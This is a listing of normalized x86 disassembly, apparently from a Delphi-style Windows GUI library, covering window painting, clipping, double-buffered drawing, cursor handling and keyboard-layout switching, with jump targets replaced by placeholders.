mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_439bf4
mov [ esi + 0xc ] eax
mov bl 0x1
sub_43cedc
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_43cffc
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43d034
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d003
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_4137ac
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_43d034
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_413808
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_4137ac
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_412378
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_4137ac
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_41bd24
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_412378
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_41bd24
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_412378
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_43737c
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_439bf4
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_43d264
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_43737c
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_43f228
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_43f228
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_439bf4
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_439bf4
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_43737c
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_43d264
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_4137ac
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_43d3b8
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43cedc
jmp r-xdata
mov eax ebx
call sub_43bf58
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43d50a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_43f228
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_439bf4
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_43d3b8
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_43f228
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_43d518
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_43cea8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43d538
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_43cea8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43d5ac
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_43cea8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43d5cc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_43cea8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43d5ec
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43cea8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43d610
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43cea8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43d634
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43cea8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43d658
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43cea8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43d67c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_429004
mov edi eax
mov eax edi
call sub_4290e4
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_41c9e4
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_43f228
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_4291e4
jmp r-xdata
sub_43d704
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_43a528
test bl bl
je r-xdata
mov eax edi
call sub_43f538
mov eax edi
call sub_43f130
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_43f130
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_43d7c4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_43a184
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_43d814
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43f538
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_43bae8
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_403454
sub_43d85c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_438584
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_43cb14
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_457fe0
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4564c8
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_43d9ac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_43da8b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43da92
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_43f228
mov dl [ ebx + 0x184 ]
call sub_443e88
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_456440
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407be4
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_456240
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_456240
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_456240
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_43da98
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43db22
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43db29
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_456440
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407be4
test eax eax
je r-xdata
mov eax ebx
call sub_43f228
mov dl 0x1
call sub_443e6c
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_43db84
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_412368
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_439bf4
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_43dbd4
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_43dc08
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_403454
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_403454
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_43dc48
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_439bf4
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_43dca0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_419654
mov edx [ r-xdata ]
call sub_403408
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_43dcd8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_4137ac
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43dcfc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_43f228
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_43dd58
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_43dcc4
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_4137ac
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_43dd98
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_4055e4
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_4055e4
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_43de04
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_43deac
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43deb3
lea eax [ ebp - 0x4 ]
call sub_4055cc
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_4366ec
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_403258
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_4055cc
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_403454
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_4055e4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ edi + 0x178 ] eax
sub_43debc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_43bac0
xor edx edx
push ebp
push sub_43df7e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_403454
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43df85
mov eax [ ebp - 0x4 ]
call sub_43bac8
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_43df85
mov eax [ ebp - 0x4 ]
call sub_44f7bc
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_438ca0
sub_43dfd0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4031a0
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43a8b4
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_43e03a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_403454
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_438ca0
sub_43e054
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_43e07c
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_44f7bc
mov ebp eax
test ebp ebp
